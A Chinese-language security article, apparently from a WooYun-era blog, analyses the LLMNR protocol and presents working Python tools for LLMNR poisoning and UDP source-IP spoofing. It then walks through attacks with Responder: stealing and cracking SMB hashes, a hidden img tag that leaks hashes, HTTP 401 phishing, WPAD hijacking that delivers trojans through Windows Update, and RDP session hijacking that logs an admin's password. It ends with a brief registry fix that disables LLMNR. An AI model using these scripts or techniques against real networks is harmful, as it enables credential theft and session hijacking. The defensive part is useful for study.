# 利用 LLMNR 名称解析缺陷劫持内网指定主机会话

> 本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答。后半部分则会重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。  
> 下面是本文的每一小节的 title ：
> 
> *   0x00 LLMNR 简介
> *   0x01 LLMNR 协议分析
> *   0x02 LLMNR 名称解析过程
> *   0x03 编程实现 LLMNR 的质询和应答
> *   0x04 LLMNR Poison 攻击原理
> *   0x05 利用伪造源 IP + LLMNR Poisone 劫持内网指定主机会话
> *   0x06 LLMNR Poison 实战攻击思路
> *   0x07 总结

0x00 LLMNR 简介
=============

* * *

从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。

0x01 LLMNR 协议分析
===============

* * *

LLMNR 协议定义在[RFC 4795](https://tools.ietf.org/html/rfc4795)中。文档里详细的介绍了有关于 LLMNR 协议的结构，配置以及安全性等内容。

LLMNR 的协议结构如下图所示：

![](http://drops.javaweb.org/uploads/images/a6ddd715c47e0646fdbe94694977900387beb231.jpg)

图 1：LLMNR 协议结构

LLMNR 协议结构图中各个字段的说明如下：

*   ID - Transaction ID是一个随机生成的用来标识质询与应答的 16 位标识符。
*   QR - 0 为查询，1 为响应
*   OPCODE - 是一个 4 位的字段，用来指定在此消息中的查询类型。该字段的值会在发起查询时被设置并复制到响应消息中。此规范定义了标准的查询和响应 (OPCODE 的值为零) 的行为。在未来的规范中可以在 LLMNR 中定义其他的 OPCODE。
*   C - 冲突位。
*   TC - 截断位。
*   T - 暂定，无标志。
*   Z - 保留位。
*   RCODE - 响应码。
*   QDCOUNT - 16 位的无符号整数，指定在质询部分中的条目数量。
*   ANCOUNT - 16 位的无符号整数，指定在应答部分中的资源记录数量。
*   NSCOUNT - 16 位的无符号整数，指定在权威记录部分的名称服务器资源录数量。
*   ARCOUNT - 16 位的无符号整数，指定在附加记录部分的资源记录数量。

0x02 LLMNR 名称解析过程
=================

* * *

一个完整的正常的 LLMNR 名称解析过程如下图所示：

**注：假定主机 B 已加入了组播组中。**

![](http://drops.javaweb.org/uploads/images/00e92eb0e506b9be3bb84be964776157b2fcb68a.jpg)

图 2：一个完整的正常的 LLMNR 名称解析过程

LLMNR 名称解析过程所使用的传输协议为 UDP 协议，IPv4 的广播地址为 - 224.0.0.252, IPv6 的广播地址为 - FF02:0:0:0:0:0:1:3 或 FF02::1:3。在主机中所监听的端口为 UDP/5355。

使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示：

![](http://drops.javaweb.org/uploads/images/0fc9b20fb313057e7e5980295bdc2eb4bd65895d.jpg)

图 3：一个完整的 LLMNR 质询/应答过程数据包

从上图可以看到，编号为 No.3 和 No.4 的数据包证明了主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和 IPv6 的广播地址进行了广播，质询数据包的 TID 为 0xc7f7。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或 AAAA 进行区别。一个 A 表示请求的地址类型为 IPv4 地址，四个A（AAAA）表示请求的地址类型为 IPv6 地址。

编号为 No.5 的数据包证明了主机 B（192.168.16.130）收到请求数据包后，发现有主机请求自己的 IP地址，于是向主机 A 进行单播应答，将自己的 IP 地址单播给了主机 A，应答的地址类型为 IPv4，同时该数据包的 TID 的值为上面主机 A 进行广播的数据包的 TID —— 0xc7f7。

质询的数据包详细结构如下图所示：

![](http://drops.javaweb.org/uploads/images/c784b2cd9a9d2ef421b6e17ef8e0c3f4b31651c4.jpg)

图 4：质询的数据包详细结构

应答的数据包详细结构如下图所示：

![](http://drops.javaweb.org/uploads/images/98a5a288d820ea83b93959a3b7f02b11ebac9901.jpg)

图 5：应答的数据包详细结构

0x03 编程实现 LLMNR 的质询和应答
======================

* * *

通过上面的内容，可以很直观的理解 LLMNR 进行名称解析的详细过程。使用 Python 可以快速实现 LLMNR 协议的质询和应答编程。

LLMNR 协议的质询过程实际上就是进行了一个广播。直接看代码。

质询的代码如下：

[LLMNR Query Demo Code](https://github.com/coca1ne/LLMNR_Her0in)

```
#/usr/bin/env python

__doc__ = """

    LLMNR Query ,
                    by Her0in

"""

import socket, struct

class LLMNR_Query:
    def __init__(self,name):
        self.name = name

        self.IsIPv4 = True
        self.populate()
    def populate(self):
        self.HOST = '224.0.0.252' if self.IsIPv4 else 'FF02::1:3'
        self.PORT = 5355
        self.s_family = socket.AF_INET if self.IsIPv4 else socket.AF_INET6

        self.QueryType = "IPv4"
        self.lqs = socket.socket(self.s_family, socket.SOCK_DGRAM)

        self.QueryData = (
        "\xa9\xfb"  # Transaction ID
        "\x00\x00"  # Flags Query(0x0000)? or Response(0x8000) ?
        "\x00\x01"  # Question
        "\x00\x00"  # Answer RRS
        "\x00\x00"  # Authority RRS
        "\x00\x00"  # Additional RRS
        "LENGTH"    # length of Name
        "NAME"      # Name
        "\x00"      # NameNull
        "TYPE"      # Query Type ,IPv4(0x0001)? or IPv6(0x001c)?
        "\x00\x01") # Class
        namelen = len(self.name)
        self.data = self.QueryData.replace('LENGTH', struct.pack('>B', namelen))
        self.data = self.data.replace('NAME', struct.pack(">"+str(namelen)+"s", self.name))
        self.data = self.data.replace("TYPE",  "\x00\x01" if self.QueryType == "IPv4" else "\x00\x1c")

    def Query(self):
        while(True):
            print "LLMNR Querying... -> %s" % self.name
            self.lqs.sendto(self.data, (self.HOST, self.PORT))
        self.lqs.close()

if __name__ == "__main__":
    llmnr = LLMNR_Query("Wooyun")
    llmnr.Query()

```

要对 LLMNR 协议的质询请求进行应答，首先要将本机加入多播（或组播）组中，所使用的协议为 IGMP。具体编程实现的方式可以直接构造数据包使用 UDP 发送，也可以使用套接字提供的 setsockopt 函数进行设置。

应答的实现方式很简单，创建一个 UDP 套接字使用 setsockopt 函数加入多播组并监听 5355 端口，当然也可以使用非阻塞的 SocketServer 模块实现，效果更佳。

具体代码如下：

[LLMNR Answer Demo Code](https://github.com/coca1ne/LLMNR_Her0in)

```
#/usr/bin/env python

__doc__ = """

    LLMNR Answer ,
                    by Her0in

"""

import socket, struct

class LLMNR_Answer:
    def __init__(self, addr):

        self.IPADDR  = addr
        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.init_socket()
        self.populate()
    def populate(self):

        self.AnswerData = (
            "TID"               # Tid
            "\x80\x00"          # Flags  Query(0x0000)? or Response(0x8000) ?
            "\x00\x01"          # Question
            "\x00\x01"          # Answer RRS
            "\x00\x00"          # Authority RRS
            "\x00\x00"          # Additional RRS
            "LENGTH"            # Question Name Length
            "NAME"              # Question Name
            "\x00"              # Question Name Null
            "\x00\x01"          # Query Type ,IPv4(0x0001)? or IPv6(0x001c)?
            "\x00\x01"          # Class
            "LENGTH"            # Answer Name Length
            "NAME"              # Answer Name
            "\x00"              # Answer Name Null
            "\x00\x01"          # Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?
            "\x00\x01"          # Class
            "\x00\x00\x00\x1e"  # TTL Default:30s
            "\x00\x04"          # IP Length
            "IPADDR")           # IP Address

    def init_socket(self):
        self.HOST = "0.0.0.0"
        self.PORT = 5355
        self.MulADDR  = "224.0.0.252"
        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))

    def Answser(self):
        self.las.bind((self.HOST, self.PORT))
        print "Listening..."
        while True:
            data, addr = self.las.recvfrom(1024)

            tid = data[0:2]
            namelen = struct.unpack('>B', data[12])[0]
            name = data[13:13 + namelen]

            data = self.AnswerData.replace('TID', tid)
            data = data.replace('LENGTH', struct.pack('>B', namelen))
            data = data.replace('NAME', name)
            data = data.replace('IPADDR', socket.inet_aton(self.IPADDR))

            print "Poisoned answer(%s) sent to %s for name %s " % (self.IPADDR, addr[0], name)
            self.las.sendto(data, addr)

        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,
                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))
        self.las.close()

if __name__ == "__main__":
    llmnr = LLMNR_Answer("11.22.33.44")
    llmnr.Answser()

```

最终执行后结果如下图所示：

![](http://drops.javaweb.org/uploads/images/4291ac1b35999cfc90c5d684930056c978a37282.jpg)

图 6：Python 实现 LLMNR 质询与应答 1

下图为模拟主机查询主机名称为**Wooyun**的结果

![](http://drops.javaweb.org/uploads/images/35a8b2042351f9e33b75e17f6ad39dd768b5c166.jpg)

图 7：Python 实现 LLMNR 质询与应答 2

0x04 LLMNR Poison 攻击原理
======================

* * *

图 2 说明了一个完整的正常的 LLMNR 质询/应答过程。由于 LLMNR 使用了无连接的 UDP 协议发送了广播，之后，多播组内的主机就可以对发起名称解析的主机进行应答，因此，在这个过程中，攻击者就有机可乘。

攻击者可以将自己的主机加入到组播组中，当收到其他主机进行名称解析的质询请求，就可以对发起此次名称解析的主机进行“恶意”应答。利用此缺陷进行欺骗攻击的方式称为**LLMNR Poison 攻击**。

“恶意”应答过程如下图所示：

![](http://drops.javaweb.org/uploads/images/b130aaf06c493703344409e9c43102f945f65fb3.jpg)

图 8： 攻击者进行“恶意”应答过程图示

LLMNR 名称解析的最大缺陷就是，在当前局域网中，无论是否存在主机 B（假定机器名为：SECLAB-HER0IN），只要有主机请求**SECLAB-HER0IN**都会进行一次 LLMNR 名称解析。

0x05 利用伪造源 IP + LLMNR Poisone 劫持内网指定主机会话
========================================

* * *

由于 UDP 是面向无连接的，所以不存在三次握手的过程，因此，在 LLMNR 名称解析过程中，UDP 的不安全性就凸显出来了。攻击者可以伪造源 IP 地址向广播地址发送 LLMNR 名称解析质询，之后攻击者再对这个质询进行应答，完全是一场 “自导自演” 的戏。

修改 UDP 源 IP 的代码如下：

[UDP Source IP Spoof Demo Code](https://github.com/coca1ne/LLMNR_Her0in)

```
#/usr/bin/env python

__doc__ = """

    UDP Source IP Spoof ,
                    by Her0in

"""

import socket, time
from impacket import ImpactDecoder, ImpactPacket

def UDPSpoof(src_ip, src_port, dst_ip, dst_port, data):
    ip = ImpactPacket.IP()
    ip.set_ip_src(src_ip)
    ip.set_ip_dst(dst_ip)

    udp = ImpactPacket.UDP()
    udp.set_uh_sport(src_port)
    udp.set_uh_dport(dst_port)

    udp.contains(ImpactPacket.Data(data))
    ip.contains(udp)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(ip.get_packet(), (dst_ip, dst_port))

if __name__ == "__main__":
    QueryData = (
        "\xa9\xfb"  # Transaction ID
        "\x00\x00"  # Flags Query(0x0000)? or Response(0x8000) ?
        "\x00\x01"  # Question
        "\x00\x00"  # Answer RRS
        "\x00\x00"  # Authority RRS
        "\x00\x00"  # Additional RRS
        "\x09"      # length of Name
        "Her0in-PC"    # Name
        "\x00"      # NameNull
        "\x00\x01"  # Query Type ,IPv4(0x0001)? or IPv6(0x001c)?
        "\x00\x01") # Class

    ip_src = "192.168.169.1"
    ip_dst = "224.0.0.252"

    while True:
        print("UDP Source IP Spoof %s => %s for Her0in-PC" % (ip_src, ip_dst))
        UDPSpoof(ip_src, 18743,ip_dst , 5355, QueryData)
        time.sleep(3)

```

为了不要那么暴力,加个延时，实际上在 LLMNR 应答数据包中有一个 TTL 默认为 30s，所以在实战中为了隐蔽可以将延时加大

具体攻击过程如下：

*   攻击者（IP：111.111.111.111）伪造受害者（IP：222.222.222.222）向 LLMNR 协议的广播地址发送 LLMNR 质询，请求解析名称为：HER0IN-PC（IP：333.333.333.333） 的 IP
*   攻击者（IP：111.111.111.111）加入多播组收到 “受害者” 的请求，对质询进行响应，将自己的IP（可以是任何 IP）单播给受害者

攻击的效果就是，受害者只要使用计算机名称访问**`HER0IN-PC`**这台主机的任何服务，都会被重定向到攻击者指定的 IP 上。

测试环境如下：

*   攻击者主机 IP：192.168.169.5（启动伪造 IP 进行 LLMNR 广播的恶意程序 以及 LLMNR 应答程序）
*   受害者 IP：192.168.169.1 无需任何操作
*   当受害者访问内网某台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器

看图说话，图片信息量较大 ;)

![](http://drops.javaweb.org/uploads/images/8deb1e1c95b20546ddc577a1b3a915e7b93841d1.jpg)

图 9 ： 攻击者主机 启动相应的程序，并提供了 WEB 服务

![](http://drops.javaweb.org/uploads/images/d724a1c41b20f2b90e0d9bf3048420a5be59d026.jpg)

图 10 ： 当受害者访问**`win2k3-3a85d681`**这台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器

![](http://drops.javaweb.org/uploads/images/9e1573e61edae5b59e94184162946333d0dd4c46.jpg)

图 11 ： 可以明显的看到受害者原本想访问的 WEB 服务器是 Windows Server 2003 却被攻击者“重定向”到了一台 Linux 主机上

关于“利用伪造源 IP + LLMNR Poisone 劫持内网指定主机会话”就这么多，图片信息量较大，请自行梳理，利用这种攻击手段可以做很多事情，剩下的全靠自由发挥 ；）

0x06 LLMNR Poison 实战攻击思路
========================

* * *

在局域网中，名称解析的行为是非常频繁的，只要有使用计算机名称，准确的说是 NetBIOS名称或非 FQDN 域名的地方都会产生名称解析，如 PING 主机名称，使用主机名称连接各种服务等等。Windows 系统也默认启用了 NetBIOS 和 LLMNR。这就使得 LLMNR Poison 攻击的实战价值有所提升。但实际上在实战中使用 LLMNR Poison 攻击时，会遇到一些问题。如，5355 端口被占用，防火墙拦截等，不过这些小问题都是可以解决掉的，另外还有一些不可控的客观因素，如网络稳定性等等。但这些问题也不是非常普遍不可解决的。

下面提供几种在实战中可用的 LLMNR Poison 攻击思路。以 Responder 做为攻击工具进行演示。

**劫持会话获取 HASH**

通过劫持会话获取受害者的 HASH，有两种常见的攻击场景。

*   劫持 SMB 会话获取 HASH  
    利用 LLMNR Poison 攻击劫持 SMB 会话与 SMBRelay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是 SMBRelay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用 LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMBRelay 攻击结合起来，提升攻击力。
*   使用 HTTP 401 认证获取 HASH  
    使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH。

攻击的方式大致为：

*   结合社工欺骗受害者访问一个正常的但已嵌入类似于**`<img/src=\\SECLAB-HER0IN\1.jpg width=0 height=0>`**或**`<img/src=http:\\SECLAB-HER0IN\1.jpg width=0 height=0>`**的网页。
*   当受害者访问网页后，如果受害者主机系统版本是 Vista 之后的，就会产生 LLMNR 名称解析。
*   此时攻击者的主机（已启动了 Responder ）就会收到受害者主机的 HASH。
*   当然也可以一直启动 Responder 进行监听，不需要其他额外的操作，只要有主机使用计算机名称请求 SMB 或 WEB 服务就可以得到相应主机的 HASH。

![](http://drops.javaweb.org/uploads/images/72c089108a1c891e2f7b2e2bd9b40115c3610b1e.jpg)

图 12：SMB 会话劫持获取 HASH

![](http://drops.javaweb.org/uploads/images/01042d2d48b13a614645855b91f5f031c460fe54.jpg)

图 13：使用 John 破解 SMB 会话劫持到的 HASH

**劫持会话进行钓鱼**

使用 HTTP 401 认证服务器进行钓鱼。

![](http://drops.javaweb.org/uploads/images/3fc87bcf2c89d0c127954c2948df4fb95c1ae62a.jpg)

图 14： HTTP 401 认证服务器钓鱼

![](http://drops.javaweb.org/uploads/images/a686e8d7ea4ae438e568869c5d87e07d37f6bc9b.jpg)

图 15： “钓鱼”攻击获取到了 HASH

**劫持 WPAD 获取上网记录**

在 Windows 系统中，默认启用了 WPAD 功能，可以对**IE 浏览器-工具-internet-连接-局域网设置-自动检测设置**和 系统服务中的**WinHttpAutoProxySvc**服务进行开关设置。

启用了 WPAD 的主机，会持续请求名为**WPAD**的主机名称，因此可以利用 LLMNR Poison 攻击更改受害者主机的浏览器代理设置。这样就可以在攻击者自己的代理服务器中看到受害者的上网浏览记录，也可以在受害者正在访问的网页中嵌入任何你想要嵌入的恶意脚本代码，如各种钓鱼，弹框认证，下载文件等等。另外，由于 WPAD 是一个系统的 HTTP 代理设置，所以 Windows 更新也会使用这个代理，这样就可以利用 Windows 更新将木马下载到受害者主机并自动执行。

但是 WPAD 在实战中也同样会受到各种不可控的客观因素的影响。只有手动设置了浏览器代理配置，通过 WPAD 的代理上网的效果才比较明显。

**“剑走偏锋” 获取服务器密码**

上面已经提到，在局域网中，只要有主机使用其他主机的名称请求服务就可以产生名称解析行为。假定有这样一个场景，在渗透到内网后，进一步渗透的条件很苛刻，这时候你“黔驴技穷”(:0)了，为了能在内网中拿到一台服务器，以便“站稳脚跟”。或许你可以采用“剑走偏锋”的思路，利用 LLMNR Poison 攻击进行 3389 连接欺骗，拿到服务器的密码，这样做的确有些冒险，可是总好过你直接修改 IP 去欺骗登录要好很多(真有人这么做过 ~,~!)。

测试环境如下：

*   一台 Windows Server 2008 （Win2k8 支持 LLMNR）作为管理员的主机**`IP:172.16.0.8`**
*   一台 Windows Server 2003 （假定为内网的一台服务器）**`机器名称：WIN2K3-3A85D681`****`IP:172.16.0.3`**
*   一台 Windows XP （已开 3389 为了演示效果所用）**`IP:172.16.0.100`**
*   一台 BT5-R3 攻击者的主机 （启动 Responder）**`IP:172.16.0.128`**

场景如下：

管理员的主机（Win2k8）连接内网服务器（Win2k3）进行常规维护，攻击者（BT5-R3）利用 LLMNR Poison 攻击劫持了 3389 连接会话，**为了更加明显的演示出攻击效果，我将 3389 连接会话重定向到一台 XP 中**。

OK，看图说话；），攻击效果如下：

![](http://drops.javaweb.org/uploads/images/2f1f36f9d8d74656340f3dac4373397230e60cd5.jpg)

图 16： 管理员（Win2k8）连接内网服务器（Win2k3），但是被 LLMNR Poison 攻击劫持，重定向到了 XP 上。

![](http://drops.javaweb.org/uploads/images/4dc57592c6cae84eb07a7da4cf7931611bbf7ad3.jpg)

图 17：从攻击者的机器中，也可以看到 Responder 做了“恶意”应答，同时，利用 lcx 转发 3389 也有数据流在跑，可以从 IP 中判断出来

![](http://drops.javaweb.org/uploads/images/961edac9612d9d93211497bd0ef97042d7957e0b.jpg)

图 18：在 XP 中已经安装了某记录登录密码的程序，可以记录任何成功或失败的登录信息 :D，上图中可以看到管理员输入的登录信息。

0x07 总结
=======

* * *

关于 LLMNR Poison 攻击的实战思路有很多，包括劫持 FTP，MySQL，MSSQL Server等等。具体的实现，请自由发挥。

为了防止遭到 LLMNR Poison 攻击，可以导入下面的注册表键值关闭 LLMNR：

```
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f 

```

不过，关闭了 LLMNR 以后， 可能用户的一些正常需求会受到影响，:)